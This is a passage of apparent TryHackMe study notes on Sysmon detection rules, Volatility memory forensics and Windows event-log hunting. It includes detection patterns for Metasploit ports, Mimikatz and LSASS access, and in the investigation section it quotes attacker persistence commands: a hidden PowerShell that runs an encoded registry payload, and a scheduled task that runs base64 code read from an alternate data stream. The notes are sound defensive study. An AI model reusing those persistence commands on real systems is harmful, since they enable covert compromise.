created\n\t\t```xml\n\t\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\t\u003cProcessCreate onmatch=\"exclude\"\u003e  \n\t\t\t  \u003cCommandLine condition=\"is\"\u003e\n\t\t\t\tC:\\Windows\\system32\\svchost.exe -k appmodel -p -s camsvc\n\t\t\t  \u003c/CommandLine\u003e  \n\t\t\t\u003c/ProcessCreate\u003e  \n\t\t\u003c/RuleGroup\u003e\n\t\t```\n\t- ¬†exclude the `svchost.exe` process from the event logs\n- Event ID 3: Network Connection\n\t- ¬†will look for events that occur remotely\n\t\t```xml\n\t\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\t\u003cNetworkConnect onmatch=\"include\"\u003e  \n\t\t\t  \u003cImage condition=\"image\"\u003enmap.exe\u003c/Image\u003e  \n\t\t\t  \u003cDestinationPort \n\t\t\t\t\tname=\"Alert,Metasploit\"\n\t\t\t\t\tcondition=\"is\"\u003e\n\t\t\t\t  4444\n\t\t\t  \u003c/DestinationPort\u003e  \n\t\t\t\u003c/NetworkConnect\u003e  \n\t\t\u003c/RuleGroup\u003e\n\t\t```\n- Event ID 7: Image Loaded\n\t- will look for¬†DLLs loaded by processes, which is useful when hunting for DLL Injection and DLL Hijacking attacks\n\t- exercise caution when using this Event ID as it causes a high system load\n\t\t```xml\n\t\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\t\u003cImageLoad onmatch=\"include\"\u003e  \n\t\t\t  \u003cImageLoaded condition=\"contains\"\u003e\\Temp\\\u003c/ImageLoaded\u003e  \n\t\t\t\u003c/ImageLoad\u003e  \n\t\t\u003c/RuleGroup\u003e\n\t\t```\n- Event ID 8: [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)\n\t- will monitor for processes injecting code into other processes\n\t\t```xml\n\t\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\t\u003cCreateRemoteThread onmatch=\"include\"\u003e  \n\t\t\t  \u003cStartAddress name=\"Alert,Cobalt Strike\" condition=\"end with\"\u003e0B80\u003c/StartAddress\u003e  \n\t\t\t  \u003cSourceImage condition=\"contains\"\u003e\\\u003c/SourceImage\u003e  \n\t\t\t\u003c/CreateRemoteThread\u003e  \n\t\t\u003c/RuleGroup\u003e\n\t\t```\n\t- look at the memory address for a specific ending condition which could be an indicator of a Cobalt Strike beacon\n\t- look for injected processes that do not have a parent process\n- Event ID 12 / 13 / 14: Registry Event\n\t- looks for changes or modifications to the registry\n\t- malicious activity from the registry can include persistence and credential abuse\n\t\t```xml\n\t\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\t\u003cRegistryEvent onmatch=\"include\"\u003e  \n\t\t\t  \u003cTargetObject name=\"T1484\" condition=\"contains\"\u003e\n\t\t\t\t  Windows\\System\\Scripts\n\t\t\t  \u003c/TargetObject\u003e  \n\t\t\t\u003c/RegistryEvent\u003e  \n\t\t\u003c/RuleGroup\u003e\n\t\t```\n- Event ID 15: [FileCreateStreamHash](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90015)\n\t- look for any files created in an alternate data stream\n\t- common technique used by adversaries to hide malware\n\t\t```xml\n\t\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\t\u003cFileCreateStreamHash onmatch=\"include\"\u003e  \n\t\t\t  \u003cTargetFilename condition=\"end with\"\u003e.hta\u003c/TargetFilename\u003e  \n\t\t\t\u003c/FileCreateStreamHash\u003e  \n\t\t\u003c/RuleGroup\u003e\n\t\t```\n\t- look for files with the `.hta` extension that have been placed within an alternate data stream\n- Event ID 22: DNS Event\n\t- log all¬†DNS¬†queries and events for analysis\n\t- most common way to deal with these events is to exclude all trusted domains that you know will be very common \"noise\" in your environment\n\t- once you get rid of the noise you can then look for DNS anomalies\n\t\t```xml\n\t\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\t\u003cDnsQuery onmatch=\"exclude\"\u003e  \n\t\t\t  \u003cQueryName condition=\"end with\"\u003e.microsoft.com\u003c/QueryName\u003e  \n\t\t\t\u003c/DnsQuery\u003e  \n\t\t\u003c/RuleGroup\u003e\n\t\t```\n\t- exclude any DNS events with the `.microsoft.com` query\n\n\n## Cutting out the noise\n- **Exclude \u003e Include**: it's typically best to prioritize excluding events rather than including events. This prevents you from accidentally missing crucial events and only seeing the events that matter the most\n- **Use the CLI**: gives you the most control and filtering allowing for further granular control. You can use either `Get-WinEvent` or `wevutil.exe` to access \u0026 filter logs *(see [[write-ups/thm/windows-event-logs]])*\n- **Know your env before implementation**: should have a firm understanding of the network or environment you are working within to fully understand what is normal and what is suspicious in order to effectively craft your rules\n### Answers\n- How many event ID 3 events are in `C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Filtering.evtx`?\n\t```powershell\n\tGet-WinEvent -Path .\\Filtering.evtx -FilterXPath '*/System/EventID=3' | Measure-Object\n\t\n\tCount    : 73591\n\t```\n- What is the UTC time created of the first network event in¬†`C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Filtering.evtx`?: `2021-01-06 01:35:50.464`\n\t- in Event Viewer: `Filter Current Log \u003e EventID 3 \u003e Sort by date \u0026 time`\n\n## Hunting Metasploit\n\n- how malware and payloads interact with the network check out the¬†[Malware Common Ports Spreadsheet](https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo)\n- detect the creation of new network connections: use `EventId=3` \u0026 active connections on `4444` \u0026 `5555`\n\t```xml\n\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\u003cNetworkConnect onmatch=\"include\"\u003e  \n\t\t\t\u003cDestinationPort condition=\"is\"\u003e4444\u003c/DestinationPort\u003e  \n\t\t\t\u003cDestinationPort condition=\"is\"\u003e5555\u003c/DestinationPort\u003e  \n\t\t\u003c/NetworkConnect\u003e  \n\t\u003c/RuleGroup\u003e\n\t```\n- Using Powershell's [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.2)\n\t```powershell\n\tGet-WinEvent -Path .\\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=4444'\n\t```\n\t\n## Detecting [Mimikatz](https://github.com/ParrotSec/mimikatz)\n\n- looking for files created with the name Mimikatz: simple way to detect activity that has bypassed anti-virus or other detection measures\n\t```xml\n\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\u003cFileCreate onmatch=\"include\"\u003e  \n\t\t\t\u003cTargetFileName condition=\"contains\"\u003emimikatz\u003c/TargetFileName\u003e  \n\t\t\u003c/FileCreate\u003e  \n\t\u003c/RuleGroup\u003e\n\t```\n\u003e **NOTE:** when dealing with an advanced threat you will need more advanced hunting techniques like searching for LSASS behavior but this technique can still be useful\n\n- abnormal `LSASS` behavior\n\t- can use the¬†`ProcessAccess`¬†event ID\n\t- show potential LSASS abuse which usually connects back to Mimikatz some other kind of credential dumping tool\n\t- if LSASS is accessed by a process other than¬†`svchost.exe`¬†it should be considered suspicious\n\t```xml\n\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\u003cProcessAccess onmatch=\"exclude\"\u003e  \n\t\t\t\u003cSourceImage condition=\"image\"\u003esvchost.exe\u003c/SourceImage\u003e  \n\t\t\u003c/ProcessAccess\u003e\n\t\t\u003cProcessAccess onmatch=\"include\"\u003e  \n\t\t\t\u003cTargetImage condition=\"image\"\u003elsass.exe\u003c/TargetImage\u003e  \n\t\t\u003c/ProcessAccess\u003e  \n\t\u003c/RuleGroup\u003e\n\t```\n\t- or with powershell\n\t```powershell\n\tGet-WinEvent -Path .\\Hunting_Mimikatz.evtx -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name=\"TargetImage\"] and */EventData/Data=\"C:\\Windows\\system32\\lsass.exe\"' | Format-List\n\t```\n\t\n## Hunting Malware\n- RATs typically come with other Anti-Virus and detection evasion techniques\n\t- also uses a Client-Server model and comes with an interface for easy user administration\n\t- examples: [Xeexe](https://github.com/jesusgavancho/Xeexe) \u0026 [Quasar](https://github.com/quasar/Quasar)\n- to detect and hunt malware we will need to first identify the malware that we want to hunt or detect and identify ways that we can modify configuration files, this is known as **hypothesis-based hunting**\n- look through and create a configuration file to hunt and detect suspicious ports open on the endpoint\n- example from [Ion-Storm](https://github.com/ion-storm/sysmon-edr) which will alert specific ports *(i.e `1034` \u0026 `1604`)* as well ass exclude common network conn *(e.g OneDrive)*\n\t```xml\n\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\u003cNetworkConnect onmatch=\"include\"\u003e  \n\t\t\t\u003cDestinationPort condition=\"is\"\u003e1034\u003c/DestinationPort\u003e  \n\t\t\t\u003cDestinationPort condition=\"is\"\u003e1604\u003c/DestinationPort\u003e  \n\t\t\u003c/NetworkConnect\u003e  \n\t\t\u003cNetworkConnect onmatch=\"exclude\"\u003e  \n\t\t\t\u003cImage condition=\"image\"\u003eOneDrive.exe\u003c/Image\u003e  \n\t\t\u003c/NetworkConnect\u003e  \n\t\u003c/RuleGroup\u003e\n\t```\n\t\n\u003e **NOTE**: When using configuration files in a production env you need to understand exactly what is happening within the conf file. (e.g ¬†the Ion-Storm configuration file excludes port 53 as an event which adversaries have begun to usse as part of their payloads)\n\n- look for all `Network connection` events that have the destination port `8080`\n```powershell\nGet-WinEvent -Path .\\Hunting_Rats.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=8080' |Format-List\n```\n\n## Hunting Persistence\n- persistence is used by attackers to maintain access to a machine once it is compromised\n- there's multiple ways an attacker can achieve this, but we will focus on [registry modification](https://attack.mitre.org/techniques/T1112/) \u0026 [startup scripts](https://attack.mitre.org/techniques/T1547/) *(i.e File Creation events as well as Registry Modification events)*\n\n### Startup \n- SwiftOnSecurity detections for a file being placed in the¬†`\\Startup\\`¬†or¬†`\\Start Menu`¬†directories.\n```xml\n\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\u003cFileCreate onmatch=\"include\"\u003e  \n\t\t\u003cTargetFilename name=\"T1023\" condition=\"contains\"\u003e\\Start Menu\u003c/TargetFilename\u003e  \n\t\t\u003cTargetFilename name=\"T1165\" condition=\"contains\"\u003e\\Startup\\\u003c/TargetFilename\u003e  \n\t\u003c/FileCreate\u003e  \n\u003c/RuleGroup\u003e\n```\n\n### Registry Key\n- SwiftOnSecurity detection this time for a registry modification that adjusts that places a script inside¬†`CurrentVersion\\Windows\\Run`¬†and other registry locations\n\n```xml\n\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\u003cRegistryEvent onmatch=\"include\"\u003e  \n\t\t\u003cTargetObject name=\"T1060,RunKey\" condition=\"contains\"\u003eCurrentVersion\\Run\u003c/TargetObject\u003e  \n\t\t\u003cTargetObject name=\"T1484\" condition=\"contains\"\u003eGroup Policy\\Scripts\u003c/TargetObject\u003e  \n\t\t\u003cTargetObject name=\"T1060\" condition=\"contains\"\u003eCurrentVersion\\Windows\\Run\u003c/TargetObject\u003e  \n\t\u003c/RegistryEvent\u003e  \n\u003c/RuleGroup\u003e\n```\n\n## Detecting Evasion Techniques\n- Various evasion techniques are used by malware authors to both evade anti-virus \u0026 detections *(e.g Alternate Data Streams, Injections, Masquerading, Packing/Compression, Recompiling, Obfuscation, Anti-Reversing Techniques)*\n- [Injection techniques](https://attack.mitre.org/techniques/T1055/) come in many different types: Thread Hijacking, PE Injection,¬†DLL¬†Injection, and more\n\n### Hunting ADS\n- [Alternate Data Streams are used by malware](https://attack.mitre.org/techniques/T1564/004/) to hide its files from normal inspection by saving the file in a different stream apart from¬†`$DATA`\n- Event ID 15 will hash and log any NTFS Streams that are included within the Sysmon configuration file\n- To aid in hunting ADS we will be using the SwiftOnSecurity Sysmon configuration file: will look for files in the¬†`Temp`¬†and¬†`Startup`¬†folder as well as¬†`.hta`¬†and¬†`.bat`¬†extension\n```xml\n\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\u003cFileCreateStreamHash onmatch=\"include\"\u003e  \n\t\t\u003cTargetFilename condition=\"contains\"\u003eDownloads\u003c/TargetFilename\u003e  \n\t\t\u003cTargetFilename condition=\"contains\"\u003eTemp\\7z\u003c/TargetFilename\u003e  \n\t\t\u003cTargetFilename condition=\"ends with\"\u003e.hta\u003c/TargetFilename\u003e  \n\t\t\u003cTargetFilename condition=\"ends with\"\u003e.bat\u003c/TargetFilename\u003e  \n\t\u003c/FileCreateStreamHash\u003e  \n\u003c/RuleGroup\u003e\n```\n\n### Detecting Remote Threads\n- adversaries also commonly use remote threads to evade detections in combination with other techniques\n- remote threads are created using the Windows API¬†`CreateRemoteThread`¬†and can be accessed using¬†`OpenThread`¬†and¬†`ResumeThread`\n- used in multiple evasion techniques including¬†DLL¬†Injection, Thread Hijacking, and Process Hollowing\n- will be using the Sysmon `eventID 8` from the SwiftOnSecurity configuration file\n- exclude common remote threads without including any specific attributes this allows for a more open and precise event rule\n```xml\n\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\u003cCreateRemoteThread onmatch=\"exclude\"\u003e  \n\t\t\u003cSourceImage condition=\"is\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/SourceImage\u003e  \n\t\t\u003cTargetImage condition=\"is\"\u003eC:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\u003c/TargetImage\u003e  \n\t\u003c/CreateRemoteThread\u003e  \n\u003c/RuleGroup\u003e\n```\n\n### Detecting Evasion Techniques with PowerShell\n- Detecting Alternate Data Streams: `Get-WinEvent -Path \u003cPath to Log\u003e -FilterXPath '*/System/EventID=15'`\n- Detecting Remote Thread Creation: `Get-WinEvent -Path \u003cPath to Log\u003e -FilterXPath '*/System/EventID=8'`\n\n## Practical Investigations\nEvent files used within this task have been sourced from the¬†[EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/tree/master)¬†and¬†[SysmonResources](https://github.com/jymcheong/SysmonResources)Github repositories.\n\n### 1 - ugh, BILL THAT'S THE WRONG USB!\nIn this investigation, your team has received reports that a malicious file was dropped onto a host by a malicious USB. They have pulled the logs suspected and have tasked you with running the investigation for it.\n\n- we see 4 `RawAccessRead` events\n\t- `RawAccessRead` event detects when a process conducts reading operations from the drive using the `\\\\.\\ ` denotation\n\t- often used by malware for data exfiltration of files that are locked for reading, as well as to avoid file access auditing toolsA\n\t- exfiltrated 2 files: `explorer.exe` \u0026 `svchost.exe` on `\\Device\\HarddiskVolume3`\n- then it changes 2 regisstry keys\n\t- `HKLM\\System\\CurrentControlSet\\Enum\\WpdBusEnumRoot\\UMB\\`\n\t- `HKLM\\SOFTWARE\\Microsoft\\Windows Portable Devices\\Devices\\WPDBUSENUMROOT`\n- uses the `WUDFHost.exe` *([Windows User-Mode Driver Framework](https://docs.microsoft.com/en-us/windows-hardware/drivers/wdf/overview-of-the-umdf))*: \n\t- ![[write-ups/images/Pasted image 20220615021517.png]]\n\n### 2 - This isn't an HTML file?\nAnother suspicious file has appeared in your logs and has managed to execute code masking itself as an HTML file, evading your anti-virus detections. Open the logs and investigate the suspicious file\n\n- adversary made use of the `iexplore.exe` to lunch `update.hta` masked as an HTML file: `update.html`\n- the `update.hta` was executed by `mshta.exe`, which provides ¬†the [Microsoft HTML Application Host](https://win10.support/mshta-exe-microsoft-r-html-application-host/) that allow execution of `.hta` files *(HTML apps)*\n- then, a network connection to their C2 was spawned\n\t- ![[write-ups/images/Pasted image 20220615025058.png]]\n\n### 3.1 : 3.2 - Where's the bouncer when you need him\nYour team has informed you that the adversary has managed to set up persistence on your endpoints as they continue to move throughout your network. Find how the adversary managed to gain persistence using logs provided\n\n- 3.1\n\t- adversary achieved persistence by uploading a payload to the `HKLM\\SOFTWARE\\Microsoft\\Network\\debug` registry\n\t- then to launch it used powershell: `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=$((gp HKLM:Software\\Microsoft\\Network debug).debug);start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;uu`\n\t- details about the connection *(ip, infected host)*\n\t\t- ![[write-ups/images/Pasted image 20220615025709.png]]\n- 3.2 \n\t- attacker deployed payload in `c:\\users\\q\\AppData:blah.txt` using `cmd.exe /C echo \"payload\"`\n\t- then, created a scheduled task using the deployed payload through `schtasks.exe`\n\t```powershell\n\t\"C:\\WINDOWS\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($(cmd /c ''more \u003c c:\\users\\q\\AppData:blah.txt'''))))\\\"\"\n\t```\n\t- following for `lsass.exe` to be accessed by the scheduled task\n\n---\n\n## References\n- [Malware Back Connect Ports Spreadsheet](https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo/edit#gid=0)\n\n## See Also\n- [[write-ups/thm/windows-event-logs]]\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/volatility":{"title":"Volatility","content":"\n## Obtaining Memory Samples\n- live machines (turned on) can have their memory captured with one of the following tools\n\t- [FTK Imager](https://accessdata.com/product-download/ftk-imager-version-4-2-0)\n\t- [Redline](https://www.fireeye.com/services/freeware/redline.html)\n\t- `DumpIt.exe`\n\t- `win32dd.exe` / `win64dd.exe` *(psexec support, great for IT departments if your¬†EDR¬†solution doesn't support this)*\n- will typically output a `.raw` file which contains an image of the system memory\n- offline maachines can have their memory pulled relatively easily as long as their drives aren't encrypted\n\t- in Windows by getting the `%SystemDrive%/hiberfil.sys` file\n\t- known as the Windows hibernation file contains a compressed memory image from the previous boot *(4 faster boot-up times)*\n- what about virtual machines? quick sampling of the memory capture process containing a memory image for different hypervisors\n\t- VMware: `.vmem` \n\t- Hyper-V:    `.bin`  \n\t- Parallels:  `.mem`  \n\t- VirtualBox: `.sav`      \n\t- can often be found simply in the data store of the corresponding hypervisor and often can be simply copied without shutting the associated virtual machine off\n\t- allows for virtually zero disturbance to the virtual machine, preserving it's forensic integrity\n\n## Examining the patient\n- Determining profile\n\n\t```bash\n\t# vol2\n\tvolatility -f cridex.vmem imageinfo\n\n\t# vol3\n\tvol.py -f cridex.vmem windows.info.info\n\t```\n\t- ![[write-ups/images/Pasted image 20220619160741.png]]\n\n- Process Information\n\t```bash\n\t# vol2\n\tvol.py -f ‚Äú/path/to/file‚Äù ‚Äë‚Äëprofile \u003cprofile\u003e pslist\n\tvol.py -f ‚Äú/path/to/file‚Äù ‚Äë‚Äëprofile \u003cprofile\u003e psscan\n\tvol.py -f ‚Äú/path/to/file‚Äù ‚Äë‚Äëprofile \u003cprofile\u003e pstree\n\tvol.py -f ‚Äú/path/to/file‚Äù ‚Äë‚Äëprofile \u003cprofile\u003e psxview\n\n\t# vol3\n\tvol.py -f ‚Äú/path/to/file‚Äù windows.pslist\n\tvol.py -f ‚Äú/path/to/file‚Äù windows.psscan\n\tvol.py -f ‚Äú/path/to/file‚Äù windows.pstree\n\t```\n\t- ![[write-ups/images/Pasted image 20220619161107.png]]\n\t- fairly common for malware to attempt to hide itself and the process associated with it. We can view hidden procs with `psxview` \n\t- ![[write-ups/images/Pasted image 20220619161125.png]]\n\t- as we can see the `csrss.exe` has only 1 `False` field\n- `ldrmodules`: if any of these 3 cols *(InLoad, InInit, InMem)* are false =\u003e that module has been likely injected \n\t- ![[write-ups/images/Pasted image 20220619161504.png]]\n\t- `csrss.exe` has all 3 columns to `False` =\u003e further inspection\n- Processes aren't the only area we're concerned with when we're examining a machine. With `apihooks` we can view unexpected patches in the standard system DLLs: if we see an instance of `Hooking module: \u003cunknown\u003e` it's pretty bad\n\t- ![[write-ups/images/Pasted image 20220619161857.png]]\n\t- I've only included a small part that shows all of the extraneous code introduced by the malware\n- Injected code can be a huge issue and is highly indicative of very very bad things: we can check for this with `malfind` \u0026 also dump to file: `/volatility -f ~/thm/volatility/cridex.vmem --profile=WinXPSP2x86 malfind -D maldump`\n\t- ![[write-ups/images/Pasted image 20220619162055.png]]\n- View all DLLss loaded into memory w `dlllist`\n\t- shared system libraries utilized in system processes\n\t- ommonly subjected to hijacking and other side-loading attacks\n\t```bash\n\t# vol2\n\tvol.py -f ‚Äú/path/to/file‚Äù ‚Äë‚Äëprofile \u003cprofile\u003e dlllist -p \u003cPID\u003e\n\t\n\t# vol3\n\tvol.py -f ‚Äú/path/to/file‚Äù windows.dlllist ‚Äë‚Äëpid \u003cPID\u003e\n\t```\n\t- ![[write-ups/images/Pasted image 20220619162601.png]]\n\t\n## Post Actions\n![[write-ups/images/Pasted image 20220619163718.png]]\n![[write-ups/images/Pasted image 20220619163836.png]]\n[Cridex Malware](https://www.computerhope.com/jargon/c/cridex-malware.htm)\n\n---\n\n## References\n- [Volatility Cheatsheet - Haktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-examples)\n- [Another cheatsheet with vol 2 \u0026 3](https://blog.onfvp.com/post/volatility-cheatsheet/)\n\n## See Also\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/windows-event-logs":{"title":"Windows Event Logs","content":"\n## Event Viewer\n\n```powershell\n# Get all powershell log events w id = 800\nGet-EventLog 'Windows Powershell' | Where-Object {$_.EventID -eq 800}\n\n# Display properties \nGet-EventLog 'Windows Powershell' | Where-Object {$_.EventID -eq 800} | Select-Object -Property *\n\n\tEventID\t\t: 800\n\tMachineName\t: WIN-1O0UJBNP9G7\n\tData\t\t: {}\n\tIndex\t\t: 4213\n\tCategory\t: Pipeline Execution Details\n\tCategoryNr\t: 8\n```\n\n## `wevtutil.exe`\n- enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs.\n- help: `wevtutil.exe /?` \u0026 `wevtutil.exe CMD /?`\n\n\n```powershell\n# how many log names are in the machine\nwevtutil.exe el | Measure-Object\n\tCount: 1071\n# get the 3 most recent application log events in text format\nwevtutil.exe qe Application /c:3 /rd:true /f:text\n```\n\n## [`Get-WinEvent`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-5.1)\n- gets events from event logs and event tracing log files on local and remote computers\n- **Get-WinEvent**¬†cmdlet replaces the¬†[Get-EventLog](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1)¬†cmdlet\n- generally you can filter events like so: `Get-WinEvent -LogName Application | Where-Object { $_.ProviderName -Match 'WLMS' }`\n- `FilterHashtable` parameter [is recommended](https://docs.microsoft.com/en-us/powershell/scripting/samples/Creating-Get-WinEvent-queries-with-FilterHashtable?view=powershell-7.2\u0026viewFallbackFrom=powershell-7.1) to filter event logs\n\t- Guidelines\n\t- ![[write-ups/images/Pasted image 20220613010805.png]]\n\t```powershell\n\tGet-WinEvent -FilterHashTable @{\n\t\tLogName=\"Application\"\n\t\tProviderName=\"WLMS\"\n\t}\n\t```\n\t- [Event Viewer](https://docs.microsoft.com/en-us/shows/inside/event-viewer) can provide quick information on what you need to build your hash table\n\t- more about hashtables in general [here](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_hash_tables?view=powershell-7.2\u0026viewFallbackFrom=powershell-7.1)\n\t\n## [XPath](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms256115(v=vs.100)) Queries\n- W3C created XPath (or¬†**XML¬†Path Language**). The Windows Event Log supports a subset of¬†[XPath 1.0](https://www.w3.org/TR/1999/REC-xpath-19991116/)\n- ![[write-ups/images/Pasted image 20220613011533.png]]\n- an XPath event query starts with `'*'` or `'Event'`\n- can use Event Viewer's `Details \u003e XML View` to build queries: \n\t- `Get-WinEvent -LogName Application -FilterXPath '*/System/EventID=100'`\n\t- ![[write-ups/images/Pasted image 20220613014242.png]]\n\t- or on a different element w attributes: `Get-WinEvent -LogName Application -FilterXPath '*/System/Provider[@Name=\"WLMS\"]'`\n- combining queries: `Get-WinEvent -LogName Application -FilterXPath '*/System/EventID=101 and */System/Provider[@Name=\"WLMS\"]'`\n- for elements within `EventData` it will be slightly different: `Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name=\"TargetUserName\"]=\"System\"'`\n\t- ![[write-ups/images/Pasted image 20220613014440.png]]\n\n### Answers\n![[write-ups/images/Pasted image 20220613013949.png]]\n- Using¬†**Get-WinEvent**¬†and¬†**XPath**, what is the query to find WLMS events with a System Time of¬†2020-12-15T01:09:08.940277500Z?\n\t```powershell\n\tGet-WinEvent -LogName Application -FilterXPath '*/System/TimeCreated[@SystemTime=\"2020-12-15T01:09:08.940277500Z\"] and */System/Provider[@Name=\"WLMS\"]'\n\t```\n- Using¬†**Get-WinEvent**¬†and¬†**XPath**, what is the query to find a user named Sam with an Logon Event ID of 4720?\n\t```powershell\n\tGet-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name=\"TargetUserName\"]=\"Sam\" and */System/EventID=4720'\n\t```\n- Based on the previous query, how many results are returned? : 2\n- Based on the output from the question #2, what is Message? : `A user account was creaated`\n- Still working with Sam as the user, what time was Event ID 4724 recorded? (**MM/DD/YYYY H:MM:SS AM/PM**): `12/17/2020 1:57:14 PM`\n- What is the Provider Name? `Microsoft-Windows-Security-Auditing`\n\n## Event IDs\nWhen it comes to monitoring and hunting, you need to know what you are looking for. How do we pick from the large pool of event IDs? \n\n- [The Windows Logging Cheat Sheet (Windows 7 - Windows 2012)](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/580595db9f745688bc7477f6/1476761074992/Windows+Logging+Cheat+Sheet_ver_Oct_2016.pdf)\n- [Various Windows cheatsheetss](https://www.malwarearchaeology.com/cheat-sheets)\n- [Spotting the Adversary with Windows Event Log Monitoring](https://apps.nsa.gov/iaarchive/library/reports/spotting-the-adversary-with-windows-event-log-monitoring.cfm) *(NSA)*\n- from [[Mitre ATT\u0026CK]]\n- [Events to Monitor Windows](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor)\n- [The Windows 10 and Windows Server 2016 Security Auditing and Monitoring Reference](https://www.microsoft.com/en-us/download/confirmation.aspx?id=52630)¬†*(a comprehensive list **over 700 pages**)*\n\n\u003e **Note**: Some events will not be generated by default, and certain features will need to be enabled/configured on the endpoint, such as PowerShell logging. This feature can be enabled via¬†**Group Policy**¬†or the¬†**Registry**: `Local Computer Policy \u003e Computer Configuration \u003e Administrative Templates \u003e Windows Components \u003e Windows PowerShell`\n- more on enabling it\n\t- [About Logging Windows](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1)\n\t- [Greater Visibility Through PowerShell Logging](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html)\n\t- [Configure PowerShell logging to see PowerShell anomalies in Splunk UBA](https://docs.splunk.com/Documentation/UBA/5.0.4/GetDataIn/AddPowerShell)\n\n## Answers\n\n- **Scenario I**: The server admins have made numerous complaints to Management regarding PowerShell being blocked in the environment. Management finally approved the usage of PowerShell within the environment. Visibility is now needed to ensure there are no gaps in coverage. You researched this topic: what logs to look at, what event IDs to monitor, etc. You enabled PowerShell logging on a test machine and had a colleague execute various commands\n\t- What event ID is to detect a PowerShell downgrade attack?: `400` from [this](https://www.leeholmes.com/detecting-and-preventing-powershell-downgrade-attacks/)\n\t- What is the¬†**Date and Time**¬†this attack took place?¬†(**MM/DD/YYYY H:MM:SS AM/PM**)\n\t\t\n\t\t```powershell\n\t\tGet-WinEvent -Path .\\merged.evtx |\n\t\t\tWhere-Object Id -eq 400 |\n\t\t\tForeach-Object {\n\t\t\t\t$version = [Version] ($_.Message -replace '(?s).*EngineVersion=([\\d\\.]+)*.*','$1')\n\t\t\t\tif($version -lt ([Version] \"5.0\")) { $_ }\n\t\t}\n\t\t# yields: 12/18/2020 7:50:33 AM\n\t\t```\n\t\t\n- **Scenario II**: The Security Team is using Event Logs more. They want to ensure they can monitor if event logs are cleared. You assigned a colleague to execute this action.\n\t- ![[write-ups/images/Pasted image 20220613024859.png]]\n\t- A¬†**Log clear**¬†event was recorded. What is the 'Event Record ID'? `27736`\n\t- What is the name of the computer? `PC01.example.corp`\n- **Scenario III**: The threat intel team shared its research on¬†**Emotet**. They advised searching for event ID 4104 and the text \"ScriptBlockText\" within the EventData element. Find the encoded PowerShell payload.\n\t- ![[write-ups/images/Pasted image 20220613030426.png]]\n\t\t```powershell\n\t\tGet-WinEvent -Path .\\merged.evtx -FilterXPath '*/System/EventID=4104 and */EventData/Data[@Name=\"ScriptBlockText\"]' -Oldest -MaxEntries 1 | Format-List\n\t\t```\n\t- What is the name of the first variable within the PowerShell command? `$Va5w3n8`\n\t- What is the¬†**Date and Time**¬†this attack took place?¬†(**MM/DD/YYYY H:MM:SS AM/PM**): `8/25/2020 10:09:28`\n\t- What is the¬†**Execution Process ID**? `6620`\n- **Scenario IV**: A report came in that an intern was suspected of running unusual commands on her machine, such as enumerating members of the Administrators group. A senior analyst suggested searching for \"`C:\\Windows\\System32\\net1.exe`\". Confirm the suspicion\n\t- What is the¬†**Group Security ID**¬†of the group she enumerated? `S-1-5-32-544`\n\t- What is the event ID? `4799`\n\n\n---\n\n## References\n- [Windows Event Attack 